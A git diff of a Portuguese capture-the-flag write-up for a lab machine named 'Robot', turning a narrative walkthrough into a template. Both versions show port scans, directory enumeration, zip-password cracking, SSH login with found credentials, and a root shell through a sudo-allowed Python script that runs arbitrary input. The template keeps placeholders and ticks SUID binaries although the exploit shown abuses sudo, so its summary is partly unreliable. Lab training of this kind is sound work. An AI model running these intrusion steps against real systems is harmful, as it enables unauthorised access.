@@ -1,122 +1,180 @@
-Writeup da Máquina Robot (CTF Imaginário)
-1. Enumeração Inicial
-Primeiro, identificamos a máquina alvo na rede. Usamos netdiscover ou arp-scan:
+# Robot
 
-bash
-sudo netdiscover -r 192.168.1.0/24
-O IP da máquina Robot é 192.168.1.100.
+> **Dificuldade:** Easy | **SO:** Linux | **Release:** Retired
 
-Em seguida, escaneamos portas abertas com nmap:
+---
 
-bash
-nmap -sV -sC -p- 192.168.1.100 -Pn
-Resultado:
+## Informações Gerais
 
-text
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.9p1
-80/tcp open  http    Apache httpd 2.4.38
-Apenas as portas 22 (SSH) e 80 (HTTP) estão abertas. Começamos pelo serviço web.
+| Campo | Valor |
+|:------|:------|
+| **Nome** | Robot |
+| **IP** | 10.10.10.10 |
+| **SO** | Linux |
+| **Dificuldade** | Easy |
+| **Data** | DD/MM/YYYY |
+| **Release** | Retired |
 
-2. Exploração Web
-Acessamos http://192.168.1.100 no navegador. Aparece uma página simples com um robô desenhado e o texto:
-"Eu sou o Robot. Meu criador esqueceu um arquivo importante aqui..."
+---
 
-2.1. Robots.txt
-Seguindo a dica, testamos o arquivo /robots.txt:
+## Enumeração Inicial
 
-bash
-curl http://192.168.1.100/robots.txt
-Saída:
+### Portas Abertas
 
-text
-User-agent: *
-Disallow: /secret_zone/
-Disallow: /backup.zip
-2.2. Explorando os diretórios
-Acessamos /secret_zone/ – há um diretório listável com um único arquivo: note.txt.
+| Porta | Serviço | Versão |
+|:------|:--------|:-------|
+| 22 | ssh | OpenSSH 7.9p1 |
+| 80 | http | Apache 2.4.38 |
 
-Conteúdo de note.txt:
+### Comandos
 
-text
-Robot, eu sei que você gosta de comandos. Aqui está sua senha: robot:4p0c4l1ps3!
-Achamos uma possível credencial: usuário robot, senha 4p0c4l1ps3!.
+```bash
+# Scan rápido
+nmap -sV -p- -T4 10.10.10.10
 
-2.3. Backup.zip
-Também baixamos o arquivo /backup.zip:
+# Scan completo com scripts
+nmap -sVC -p- 10.10.10.10
+```
 
-bash
-wget http://192.168.1.100/backup.zip
-unzip backup.zip
-O zip está protegido por senha. Usamos fcrackzip para quebrar:
+---
 
-bash
-fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
-Senha encontrada: robot123. Dentro do zip, há um arquivo creds.txt com as mesmas credenciais já descobertas.
+## Exploração
 
-3. Acesso via SSH
-Usamos as credenciais para logar via SSH:
+### Vetor de Entrada
 
-bash
-ssh robot@192.168.1.100
-password: 4p0c4l1ps3!
-Logado com sucesso. A flag do usuário está em /home/robot/user.txt:
+| Campo | Valor |
+|:------|:------|
+| **Vetor** | Web |
+| **Falha** | Descrição da vulnerabilidade |
+| **Ferramentas** | curl, burp, etc |
 
-bash
-cat /home/robot/user.txt
-Flag do usuário: CTF{r0b0t_1s_aliv3}
+### Passo 1 - Acesso à interface web
 
-4. Escalação de Privilégio (Root)
-Executamos sudo -l para ver comandos permitidos:
+Acessar http://10.10.10.10 no navegador.
 
-bash
+Encontrar pista no código fonte ou em arquivos como robots.txt.
+
+### Passo 2 - Enumeração de diretórios
+
+```bash
+# Testar robots.txt
+curl http://10.10.10.10/robots.txt
+
+# Enumeração com gobuster
+gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -t 20
+```
+
+### Passo 3 - Encontrar credenciais
+
+Encontrar credenciais em:
+- Arquivos descobertos (note.txt, backup.zip, etc)
+- Código fonte
+- Parâmetros da aplicação
+
+### Resultado
+
+| Campo | Valor |
+|:------|:------|
+| **Usuário** | robot |
+| **Credenciais** | robot:4p0c4l1ps3! |
+
+---
+
+## Shell Inicial
+
+```bash
+ssh robot@10.10.10.10
+# senha: 4p0c4l1ps3!
+python3 -c "import pty; pty.spawn('/bin/bash')"
+```
+
+---
+
+## Enumeração Pós-Exploração
+
+### Usuários do Sistema
+
+| Usuário | Shell | Home |
+|:--------|:------|:-----|
+| root | /bin/bash | /root |
+| robot | /bin/bash | /home/robot |
+
+### Credenciais Encontradas
+
+| Tipo | Valor |
+|:-----|:------|
+| SSH | robot:4p0c4l1ps3! |
+
+### Arquivos Interessantes
+
+```bash
+# Verificar permissões sudo
 sudo -l
-Saída:
+```
 
-text
-User robot may run the following commands:
-    (ALL) NOPASSWD: /usr/bin/python3 /opt/robot_manager.py
-Temos permissão para executar um script Python como root sem senha.
+---
 
-4.1. Analisando o script
-Visualizamos o conteúdo do script:
+## Escalação de Privilégios
 
-bash
-cat /opt/robot_manager.py
-Código:
+### Vetores Identificados
 
-python
-#!/usr/bin/env python3
-import os
+- [ ] Cron jobs executando como root
+- [x] Binários SUID
+- [ ] Permissões sudo mal configuradas
 
-command = input("Comando do robô: ")
-os.system(command)
-O script simplesmente executa qualquer comando passado pelo usuário. Como ele roda com sudo e sem restrições, podemos abrir uma shell interativa.
+### Exploração
 
-Executamos:
+```bash
+# Verificar comandos permitidos
+sudo -l
+```
 
-bash
+### Resultado
+
+| Campo | Valor |
+|:------|:------|
+| **Acesso** | root |
+| **Método** | Exploração de sudo |
+| **Data** | DD/MM/YYYY |
+
+### Exploit
+
+```bash
+# Executar script vulnerável
 sudo /usr/bin/python3 /opt/robot_manager.py
-Quando pedir o comando, digitamos:
 
-bash
+# Quando pedir comando, digitar:
 /bin/bash
-Pronto! Agora estamos com shell de root.
+```
 
-4.2. Flag do root
-A flag final está em /root/root.txt:
+---
 
-bash
-cat /root/root.txt
-Flag do root: CTF{robot_master_421}
+## Flags
 
-5. Conclusão
-A máquina Robot foi comprometida com técnicas básicas:
+| User | Root |
+|:-----------------------------|:---------------------|
+| `CTF{r0b0t_1s_aliv3}` | `CTF{robot_master_421}` |
 
-Enumeração de portas.
+---
 
-Descoberta de /robots.txt → diretório secreto e backup.zip.
+## Resumo Técnico
 
-Credenciais obtidas e acesso SSH.
+| Campo | Valor |
+|:------|:------|
+| **Causa Raiz** | Descrição da vulnerabilidade principal |
+| **Cadeia de Ataque** | Enumeração → Credenciais → Shell inicial → Privesc |
+| **Tempo Total** | ~45 minutos |
 
-Abuso de sudo em script Python vulnerável para escalar privilégio.
+---
+
+## Lições Aprendidas
+
+- **O que funcionou:** técnica X funcionou bem
+- **O que atrasou:** ponto que causou dificuldade
+- **Pontos de Atenção:** lições importantes
+
+---
+
+## Referências
+
+- [HTB Robot](https://app.hackthebox.com/machines/Robot)
